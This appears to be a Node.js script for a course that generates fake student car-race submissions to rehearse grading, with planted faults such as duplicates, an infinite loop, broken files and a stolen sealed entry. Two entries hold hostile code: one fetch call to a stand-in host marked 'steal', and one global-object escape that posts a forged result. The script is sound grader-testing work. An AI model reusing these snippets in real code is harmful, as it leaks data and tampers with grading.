// Папка с выдуманными работами для репетиции финала.
//   node tools/make-demo-entries.mjs [сколько=300] [папка=demo-entries] [--seal]
// С --seal работы запечатаны демо-ключом курса, а его секретная половина лежит рядом: <папка>.private-key.json.
// Среди запечатанных есть «вор» (сдал чужой файл) и опечатка в логине.
// Внутри: <ник>/car.json — как после `gh classroom clone` или tools/collect-entries.mjs.
// Есть всё, что бывает в жизни: одинаковые файлы, свой код, зависший код, битый файл, лишние JSON.
import { mkdirSync, writeFileSync, rmSync, readFileSync } from 'fs';
import { join } from 'path';
import { cloneBrain } from '../engine/net/brain.ts';
import { mulberry32 } from '../engine/core/utils.ts';
import { generateCourseKeys, sealCar } from '../engine/course/seal.ts';
import { FORMAT } from '../engine/course/car-file.ts';

const args = process.argv.slice(2).filter((a) => !a.startsWith('--'));
const sealed = process.argv.includes('--seal');
const count = +(args[0] ?? 300);
const dir = args[1] ?? 'demo-entries';
const bots = JSON.parse(readFileSync(new URL('./bots.json', import.meta.url), 'utf8'));
const thinkSource = readFileSync(new URL('../student/think.js', import.meta.url), 'utf8');
const rnd = mulberry32(2026);

const A = ['turbo', 'neo', 'red', 'fast', 'lazy', 'pixel', 'dark', 'happy', 'mad', 'tiny', 'mega', 'cool', 'silent', 'crazy', 'retro'];
const B = ['fox', 'coder', 'cat', 'driver', 'bot', 'moose', 'panda', 'wolf', 'duck', 'rider', 'dev', 'owl', 'tiger', 'yak', 'otter'];
const NAMES = ['Молния', 'Летти', 'Ржавая пуля', 'Тапок', 'Ракета', 'Бабуля', 'Шустрик', 'Боливар', 'Комета', 'Жук', 'Торпеда', 'Пончик'];
const pick = (list) => list[Math.floor(rnd() * list.length)];

function mutated(brain, rate) {
  const b = cloneBrain(brain);
  for (const layer of b.layers) {
    layer.weights = layer.weights.map((row) => row.map((w) => (rnd() < rate ? w + (rnd() - 0.5) * 0.4 : w)));
    layer.biases = layer.biases.map((v) => (rnd() < rate ? v + (rnd() - 0.5) * 0.4 : v));
  }
  return b;
}

// Перемешать скрытые нейроны: машина едет так же, а веса выглядят по-другому —
// как у настоящих студентов, которые учили сеть каждый со своего случайного старта
function shuffleHidden(brain) {
  for (let k = 0; k < brain.layers.length - 1; k++) {
    const layer = brain.layers[k], next = brain.layers[k + 1];
    const order = layer.biases.map((_, i) => i).sort(() => rnd() - 0.5);
    layer.weights = layer.weights.map((row) => order.map((j) => row[j]));
    layer.biases = order.map((j) => layer.biases[j]);
    next.weights = order.map((j) => next.weights[j]);
  }
  return brain;
}

const carFile = (bot, extra = {}) => ({
  format: FORMAT,
  name: `${pick(NAMES)} ${Math.floor(rnd() * 90) + 10}`,
  color: `#${Math.floor(rnd() * 0xffffff).toString(16).padStart(6, '0')}`,
  think: bot.think,
  sensors: bot.sensors,
  layers: bot.layers,
  brain: shuffleHidden(mutated(bot.brain, 0.15)),
  ...extra,
});

rmSync(dir, { recursive: true, force: true });
const keys = sealed ? await generateCourseKeys() : null;
if (keys) writeFileSync(`${dir}.private-key.json`, JSON.stringify(keys.privateFile, null, 2));
const sealedTexts = [];
const used = new Set();
let firstBrain = null;
const shared = carFile(bots[1]); // этот файл «разошёлся по рукам»
for (let i = 0; i < count; i++) {
  let nick;
  do nick = `${pick(A)}-${pick(B)}${rnd() < 0.5 ? Math.floor(rnd() * 99) : ''}`; while (used.has(nick));
  used.add(nick);
  let file = carFile(bots[i % bots.length]);
  if (i === 0) firstBrain = file.brain;
  if (i % 25 === 3) file = { ...shared, name: `${pick(NAMES)} (копия)` };
  if (i === 14) file = { ...carFile(bots[0]), brain: mutated(firstBrain, 0.3) }; // скопировал и чуть «пошевелил» веса
  if (i === 5) file = { ...file, think: 'mine', thinkSource: thinkSource.replace('(sum > bias ? 1 : 0)', '(sum > bias * 0.9 ? 1 : 0)') };
  if (i === 6) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think() { while (true) {} } } };' };
  if (i === 7) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think(inputs) { return inputs.nope.length; } } };' };
  if (i === 8) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think() { fetch("https://example.com/?steal"); return [1, 0, 0, 0]; } } };' };
  if (i === 9) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think() { return [Math.random(), 0, Math.random(), Math.random()]; } } };' };
  if (i === 10) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think() { const g = (() => {}).constructor("return this")(); g.postMessage({ jobId: 0, result: null }); return [1, 0, 0, 0]; } } };' };
  const folder = join(dir, `ai-race-final-${nick}`);
  mkdirSync(folder, { recursive: true });
  if (keys && i !== 11) {
    const login = i === 13 ? `${nick}x` : nick; // опечатка в логине
    const text = i === 12 && sealedTexts.length ? sealedTexts[0] : JSON.stringify(await sealCar(file, login, keys.publicFile)); // «вор»
    sealedTexts.push(text);
    writeFileSync(join(folder, 'car.sealed.json'), text);
  } else writeFileSync(join(folder, 'car.json'), JSON.stringify(file));
  if (i % 10 === 0) writeFileSync(join(folder, 'package.json'), '{"name":"not-a-car"}');
  if (i === 11) writeFileSync(join(folder, 'car.json'), `{"format":"${FORMAT}","name":"Сломанный","brain":{}}`);
}
console.log(`${count} работ → ${dir}/${keys ? ` (запечатаны, секретный ключ — ${dir}.private-key.json)` : ''}`);
